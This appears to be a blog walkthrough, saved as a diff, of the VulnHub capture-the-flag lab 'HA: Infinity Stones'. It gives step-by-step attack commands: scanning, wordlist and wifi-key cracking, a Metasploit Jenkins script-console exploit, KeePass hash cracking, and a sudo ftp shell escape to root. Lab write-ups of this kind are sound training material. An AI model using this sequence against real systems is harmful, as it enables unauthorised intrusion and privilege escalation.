@@ -1,0 +1,211 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">HA: Infinity Stones Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/ha-infinity-stones-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-09-20T16:38:43+00:00">September 20, 2019</time><time class="updated" datetime="2025-06-10T20:11:07+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to solve our CTF challenge called “HA: Infinity Stones” We have developed this lab for the purpose of online penetration practices. Solving this lab is not that tough if have proper basic knowledge of Penetration testing. Let’s start and learn how to breach it.</span></p>
+<p><span style="color: #000000;">Download <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/ha-infinity-stones,366/"><strong>Here</strong></a></span></span></p>
+<p><span style="color: #000000;"><strong>Level:</strong> Intermediate</span></p>
+<p><span style="color: #000000;"><strong>Task:</strong> Find 6 Flags (Stones) on the victim’s machine.</span></p>
+<h3><span style="color: #800000;">Penetration Methodologies</span></h3>
+<p><span style="color: #000000;"><strong>Scanning Network</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Netdiscover</span></li>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration (Rabbit hole)</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Abusing HTTP</span></li>
+<li><span style="color: #000000;">Dirb-Brute forcing web directory</span></li>
+<li><span style="color: #000000;">Exiftool-Metadata extracting for 1st stone</span></li>
+<li><span style="color: #000000;">2nd stone from ssl certificate</span></li>
+<li><span style="color: #000000;">Crunch-generate dictionary</span></li>
+<li><span style="color: #000000;">Aircrack-ng-cracking password of pcap</span></li>
+<li><span style="color: #000000;">capture the 3rd stone</span></li>
+<li><span style="color: #000000;">Decryption cipher text</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Metasploit- Jenkins</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Post Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Obtain 4th stone</span></li>
+<li><span style="color: #000000;">John the ripper-crack Keepaas hashes</span></li>
+<li><span style="color: #000000;">Obtain 5th stone</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Abusing sudo rights</span></li>
+<li><span style="color: #000000;">Get the Final stone</span></li>
+</ul>
+<h3><span style="color: #000000;"><strong>Walkthrough</strong></span></h3>
+<h3><span style="color: #800000;">Scanning Network</span></h3>
+<p><span style="color: #000000;">Firsts of all we try to identify our target and for this use the following command:</span></p>
+<pre class="lang:default decode:true">netdiscover</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-5hL10K_PvgM/XYTxLY1afTI/AAAAAAAAgkQ/EfjFT9oCIyMIE8kStS87ohugFuDxxJnRACLcBGAsYHQ/s1600/1.png"/></p>
+<p><span style="color: #000000;">Now that we have identified our target using the above command, we can continue on to our second step that is scanning the target. We will use nmap to scan the target with the following command:</span></p>
+<pre class="lang:default decode:true">nmap -A 192.168.0.4</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Rj5KN8pDbWY/XYTxP7JxwII/AAAAAAAAgk4/rjyR161uupsDCxlcVslaPNolB5PmvH_mgCLcBGAsYHQ/s1600/2.png"/></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">With the help of help scan, we now know that port number <strong>22, 80, 443, 8080</strong> are open with the service of <strong>SSH, HTTP, HTTPS, </strong>respectively. Now that port 80 is open we open the target IP address in our browser as shown in the following image :</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Q17wMHBDk3E/XYTxUPgvhVI/AAAAAAAAgls/u9S0yb5pcNwodSvb5bchwzqXZePJ0yDhgCLcBGAsYHQ/s1600/3.png"/></p>
+<p><span style="color: #000000;">It opened a webpage as shown in the above image. But as resulted in the nmap scanning port 8080 is also open, so now we opened our target IP with port 8080 and found a login page there as shown in the image below :</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-PvTDnpF8bUo/XYTxTPIEGPI/AAAAAAAAglk/iu0YyJNy2_Ezb_DS_WSMtZi6XTBWK4sfQCLcBGAsYHQ/s1600/4.png"/></p>
+<p><span style="color: #000000;">Now that we do not have login credentials, we explored using dirb in order to find directories, and in the result of dirb, we found two important directories i.e. <strong>/img and /wifi</strong> as shown in the image below :</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-3dxlTMjFK3g/XYTxTkzCloI/AAAAAAAAglo/h9f6q1Z4MUoHGbXoZP_IAlKqhU9D_7O9gCLcBGAsYHQ/s1600/5.png"/></p>
+<p><span style="color: #000000;">First, of them, we opened, <strong>/img</strong> directory and there was a space.jpg we found there.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-oELTm-ThiGs/XYTxUBEwNeI/AAAAAAAAglw/l8yePzkdCz4c_7Em3p-Rjet5e3vipWAnwCLcBGAsYHQ/s1600/6.png"/></p>
+<p><span style="color: #000000;">When opened this image was of the Tesseract. Nothing else in the image as you can see in the image below :</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-wcmV_uUbxyc/XYTxUiTCk9I/AAAAAAAAgl0/l2OnxD2l6agmWPQEwHZyjrxjeEmcnRFzACLcBGAsYHQ/s1600/7.png"/></p>
+<p><span style="color: #000000;">But if you remember, space stone was inside the tesseract, so we used the exif tool to see if there was metadata stored in the image. And for this use the following command :</span></p>
+<pre class="lang:default decode:true">exiftool space.jpg</pre>
+<p><span style="color: #000000;">And so, as you can see in the image below, our doubt was correct, because here we found our first flag i.e. spacestone. Now our infinity gauntlet is missing five more stones (flags). Let’s try and find them.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-2Y6P9v5qZC0/XYTxVJUOGMI/AAAAAAAAgl4/Q0bGxNkTchE3msL1tHxhPDp7rQOymp9zACLcBGAsYHQ/s1600/8.png"/></p>
+<p><span style="color: #000000;">Our target also has <strong>port 443</strong> open, which means there is a webpage on https, let’s try and open it. When you open the target IP on port 443, it shows something is not right with the <strong>SSL certificate</strong> which you can in the image below too :</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-5FezEpH4ZXk/XYTxWHeIBWI/AAAAAAAAgl8/Dn_4rFqfrVw7XkeW6nF1SL5l--51gK0agCLcBGAsYHQ/s1600/9.png"/></p>
+<p><span style="color: #000000;">Click on that lock icon and navigate yourself to its security as shown in the image below, as here you will find your second stone i.e. Mind stone. Four more stones to collect for there to be a perfect balance.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-cLTNOX_7Mi0/XYTxLcfRKfI/AAAAAAAAgkM/gQ2IuMYJ3BwXKIGuNpNkIus7B2dZ55FRACLcBGAsYHQ/s1600/10.png"/></p>
+<p><span style="color: #000000;">If you remember, with the /img directory we also found /wifi directory. So now let’s traverse through that.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-VbXdgGb3Ii8/XYTxLT8AmfI/AAAAAAAAgkU/iDRohtaHDQ8vRZSvMpcLYJSLjULrglYpgCLcBGAsYHQ/s1600/11.png"/></p>
+<p><span style="color: #000000;">Upon opening the said directory, we found two things i.e. pwd.txt and reality.cap. First, we downloaded pwd.txt to see what it had to offer. Use the following command to download it :</span></p>
+<pre class="lang:default decode:true">wget http://192.168.0.4/wifi/pwd.txt</pre>
+<p><span style="color: #000000;">Once downloaded, we read the pwd.txt file using the cat command. And it said</span></p>
+<p><span style="color: #000000;"><strong>“Your Password is thanos daughter name “gam” (note it’s all lower case) plus the following I enforced new requirement on you…12 characters</strong></span></p>
+<p><span style="color: #000000;"><strong>One uppercase character</strong></span></p>
+<p><span style="color: #000000;"><strong>Two numbers</strong></span></p>
+<p><span style="color: #000000;"><strong>Two lowercase</strong></span></p>
+<p><span style="color: #000000;"><strong>The year of the first avengers movie came out in theaters”</strong></span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-7jQtHuz9mZg/XYTxNDCuPkI/AAAAAAAAgkY/TCWdUrwWOyof7GiX8aXpkTqKwYaiXRj8wCLcBGAsYHQ/s1600/12.png"/></p>
+<p><span style="color: #000000;">Now that we know password the format of the password so we will use crunch to make a wordlist for all the possible password combinations with the following command :</span></p>
+<pre class="lang:default decode:true">crunch 12 12 -t gam,%%@@2012 -o dict.txt</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-HkWZqJFV-es/XYTxNduVQ9I/AAAAAAAAgkc/0xCARAW5YgQmKi2-JP7Y5OUZInKrs4HoQCLcBGAsYHQ/s1600/13.png"/></p>
+<p><span style="color: #000000;">Now, the other file which we found was reality.cap so while examining that file, we found wifi packets in it. So, we used aircrack-ng and used our crunch created password list to find the wifi key. And voila! We found our wifi key as shown in the image below :</span></p>
+<p> </p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-uL3ijURxCxE/XYTxNUPw4tI/AAAAAAAAgkg/iTUF_DEOH3wAYTb6_KB4-18yxhvNvMT7ACLcBGAsYHQ/s1600/14.png"/></p>
+<p><span style="color: #000000;">We used this wifi key as a directory and we found a realitystone.txt which further lead us to our reality stone. Three stones down, three more to go.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-hcxsHWiszlQ/XYTxNlPFYfI/AAAAAAAAgkk/QrQ0Slfff6YQ8KqjuRPaNQ4TIjmG9qCEQCLcBGAsYHQ/s1600/15.png"/></p>
+<p><span style="color: #000000;">Now, for the next stone, we opened the target IP on the 443 port; it had a redirecting link on the top right side. Upon clicking on the link, we are redirected to a page where there is a quiz about avengers, and also some hint related to binary. As shown in the image below :</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-K-kEI0kKzag/XYTxOjLnRUI/AAAAAAAAgko/0cjjEwkJmFs5QZCahvzJp5CSvO8AcultQCLcBGAsYHQ/s1600/16.png"/></p>
+<p> </p>
+<p><span style="color: #000000;">Upon solving the quiz, we had got the following answers with their corresponding binary value :</span></p>
+<table style="height: 318px;" width="707">
+<tbody>
+<tr>
+<td width="59"><span style="color: #000000;">S.No.</span></td>
+<td width="331"><span style="color: #000000;">Questions</span></td>
+<td width="195"><span style="color: #000000;">Answers</span></td>
+<td width="195"><span style="color: #000000;">Binary Value</span></td>
+</tr>
+<tr>
+<td width="59"><span style="color: #000000;">1.</span></td>
+<td width="331"><span style="color: #000000;">In the beginning, there are 3 infinity stones on earth.</span></td>
+<td width="195"><span style="color: #000000;">False</span></td>
+<td width="195"><span style="color: #000000;">0</span></td>
+</tr>
+<tr>
+<td width="59"><span style="color: #000000;">2.</span></td>
+<td width="331"><span style="color: #000000;">At the end, there are two survivors on Titan.</span></td>
+<td width="195"><span style="color: #000000;">True</span></td>
+<td width="195"><span style="color: #000000;">1</span></td>
+</tr>
+<tr>
+<td width="59"><span style="color: #000000;">3.</span></td>
+<td width="331"><span style="color: #000000;">Thanos already had the power stone when he first appeared.</span></td>
+<td width="195"><span style="color: #000000;">True</span></td>
+<td width="195"><span style="color: #000000;">1</span></td>
+</tr>
+<tr>
+<td width="59"><span style="color: #000000;">4.</span></td>
+<td width="331"><span style="color: #000000;">Tesseract contains the reality stone.</span></td>
+<td width="195"><span style="color: #000000;">False</span></td>
+<td width="195"><span style="color: #000000;">0</span></td>
+</tr>
+<tr>
+<td width="59"><span style="color: #000000;">5.</span></td>
+<td width="331"><span style="color: #000000;">The dwarf on Ndavellir is played by Peter Dinklage</span></td>
+<td width="195"><span style="color: #000000;">True</span></td>
+<td width="195"><span style="color: #000000;">1</span></td>
+</tr>
+<tr>
+<td width="59"><span style="color: #000000;">6.</span></td>
+<td width="331"><span style="color: #000000;">Red skull is the guardian of space stone.</span></td>
+<td width="195"><span style="color: #000000;">False</span></td>
+<td width="195"><span style="color: #000000;">0</span></td>
+</tr>
+<tr>
+<td width="59"><span style="color: #000000;">7.</span></td>
+<td width="331"><span style="color: #000000;">Thor’s new hammer is called stormbuster.</span></td>
+<td width="195"><span style="color: #000000;">False</span></td>
+<td width="195"><span style="color: #000000;">0</span></td>
+</tr>
+<tr>
+<td width="59"><span style="color: #000000;">8.</span></td>
+<td width="331"><span style="color: #000000;">Rocket is the only Guardian of the Galaxy to survive the snap.</span></td>
+<td width="195"><span style="color: #000000;">True</span></td>
+<td width="195"><span style="color: #000000;">1</span></td>
+</tr>
+</tbody>
+</table>
+<p><span style="color: #000000;">After solving the quiz and identifying their binary values, we had a binary string i.e. 01101001. We opened this string of binary characters through the URL and there was a hints.txt and further opened it and found text encrypted through brainfuck algorithm.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-kwgKgiCYsbg/XYTxPD9HZpI/AAAAAAAAgkw/7xFciEOJJpUjsZEjczaC0Jw7RjaMci_nACLcBGAsYHQ/s1600/17.png"/></p>
+<p><span style="color: #000000;">So further, we decrypted the ciphertext and got its value as admin:avengers. Here, huge possibility is that this can be log in credentials which can be used on the log in page that we found on 8080.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-iaZmarbhuDg/XYTxPKxeAgI/AAAAAAAAgks/58oYa51kui4-2e-YZMIqCbZbzNwDYpbRwCLcBGAsYHQ/s1600/18.png"/></p>
+<p><span style="color: #000000;">As deduced above, we logged in by using the above-founded credentials and were welcomed with the following page :</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-V0qsv3vFsTI/XYTxPUIhzJI/AAAAAAAAgk0/a-EF2yThgZ02atSZymB5GjRbsAn7TpKowCLcBGAsYHQ/s1600/19.png"/></p>
+<h3><span style="color: #800000;">Exploiting</span></h3>
+<p><span style="color: #000000;">The webpage has used Jenkins framework and it is commonly known for its vulnerability as in Metasploit there is an affective exploit for it. Therefore, we will use the following exploit and so, open Metasploit in kali and the following set of commands :</span></p>
+<pre class="lang:default decode:true">use exploit /multi/http/jenkins_script_console
+set target 1
+set rhosts 192.168.0.4
+set username admin
+set password avengers
+set targeturi /
+exploit</pre>
+<p><span style="color: #000000;">Once the exploit is executed, you will have a meterpreter session. And when you try to have shell by using the simple “shell” command but an improper shell session will be opened. To get a proper shell use the following command :</span></p>
+<pre class="lang:default decode:true">python3 -c 'import pty;pty.spawn("/bin/bash")'</pre>
+<p><span style="color: #000000;">Now that we have the proper shell, we tried to look for the files which had SUID bits set on them and for that we used the following command :</span></p>
+<pre class="lang:default decode:true">find / -perm -u=s -type f 2&gt;/dev/null</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-t9t9QiioD3c/XYTxQayKavI/AAAAAAAAgk8/ZjekQY5yPewr80E5mxtT1CISVk2XiaTJACLcBGAsYHQ/s1600/20.png"/></p>
+<h3><span style="color: #800000;">Post Enumeration</span></h3>
+<p><span style="color: #000000;">After running the above command, we had a list and we enumerated through them one by one. Although the one that stood out was <strong>/opt/script</strong>. And the one that had our next stone i.e. time stone was /opt/script only as shown in the following image :</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-If9N4f26NAI/XYTxQcFFUOI/AAAAAAAAglA/8cOw_eJP2hQeOmOZjdogO347qk5M5_g3gCLcBGAsYHQ/s1600/21.png"/></p>
+<p><span style="color: #000000;">As we found our fourth stone in the /opt/script we decided to explore /opt a bit more. And for that we used the following a set of commands :</span></p>
+<pre class="lang:default decode:true">cd /opt
+ls</pre>
+<p><span style="color: #000000;">The above commands allowed us to see the contents of /opt and there we found morag.kdbx. now this morag.kdbx is important for two reasons i.e. there was a planet named Morag in avengers series and .kdbx tells us that it might have password key database.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-OlRxRDSbsVU/XYTxQrCAzqI/AAAAAAAAglE/TjFyCQYmjAMqTPtvqS6cIF2IAkAyUizBgCLcBGAsYHQ/s1600/22.png"/></p>
+<p><span style="color: #000000;">So we decided to open and we met with the following dialogue box :</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Rn5lIQBgoOY/XYTxRNFu00I/AAAAAAAAglI/P1ljZ9J1P4oFV89qzZtn4wpDqPb5xT1ewCLcBGAsYHQ/s1600/23.png"/></p>
+<p><span style="color: #000000;">As we didn’t know the ‘master password’, we decided to run a python script which created the key hash and then with the additional help of john the ripper we cracked the password and to do so, type :</span></p>
+<pre class="lang:default decode:true">python keepass.py morag.kdbx &gt; hash
+john hash</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-6ItW1dLUxXw/XYTxRb3jO0I/AAAAAAAAglM/bUtGgDCtQawZWpn0NsWrMfgKkgx9kcpggCLcBGAsYHQ/s1600/24.png"/></p>
+<p><span style="color: #000000;">And as you can see in the image above, the master password is princesa. When entered this password, we found one enter on the flag tab which is powerstone. And so we found our fifth and second last stone/flag as shown in the image below :</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-lw0nC33c76Q/XYTxRj6VvnI/AAAAAAAAglQ/ABBCDHY5P7oQIqXprOtBkItY97m7zrmLgCLcBGAsYHQ/s1600/25.png"/></p>
+<p><span style="color: #000000;">Another tab, just below flags, is cred in the morag.kdbx password key database. When opened, it contained a base64 string as shown in the image below :</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-mS2oZgnThHw/XYTxR_Gv1wI/AAAAAAAAglU/v-3rWogxrrMHEOO7UIkaaYCrVjD2CqZ8QCLcBGAsYHQ/s1600/26.png"/></p>
+<p><span style="color: #000000;">So we decoded the string using the following echo command :</span></p>
+<pre class="lang:default decode:true">echo "bW9yYWc6eW9uZHU=" | base64 -d</pre>
+<p><span style="color: #000000;">The string was then decoded to plain text i.e. <strong>morag:yondu, </strong>just like in the image below :</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-XnISmj9b3D0/XYTxSDhknSI/AAAAAAAAglY/Uj-llZbLLZEs0F7R_qcnqskhRdQpYbE-wCLcBGAsYHQ/s1600/27.png"/></p>
+<p><span style="color: #000000;">We have found five stones till now using each port except SSH. And the above-decoded string can be our log in credentials to log in through SSH. Therefore, we tried it using the following command :</span></p>
+<pre class="lang:default decode:true">ssh morag@192.168.0.4</pre>
+<p><span style="color: #000000;">And then, when further asked for password type ‘yondu’ and so you are logged in just as shown in the image below :</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-YvyyVayrY30/XYTxSfflZ_I/AAAAAAAAglc/2g86Y9GSYAI7_7tIv966Krjkt9scudEoQCLcBGAsYHQ/s1600/28.png"/></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">After logging in through SSH, we used <strong>‘sudo -l’</strong> command to see which user had no password and the result was : <strong>/usr/bin/ftp. </strong> So we switched the user to ftp and further accessed root to find our final flag by using the following set of commands :</span></p>
+<pre class="lang:default decode:true">sudo ftp
+!/bin/bash
+cd/root
+ls
+cat final.txt</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-hgmlMCKn3MM/XYTxS-fAV1I/AAAAAAAAglg/qSGMxQTs8WcDUvDQKr8n4HRPJP6debUdQCLcBGAsYHQ/s1600/29.png"/></p>
+<p><span style="color: #000000;">And so, we have found all the six stones aka flags and with just a snap there can be the perfect balance in the universe.</span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contac</span>t <strong><a class="broken_link" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
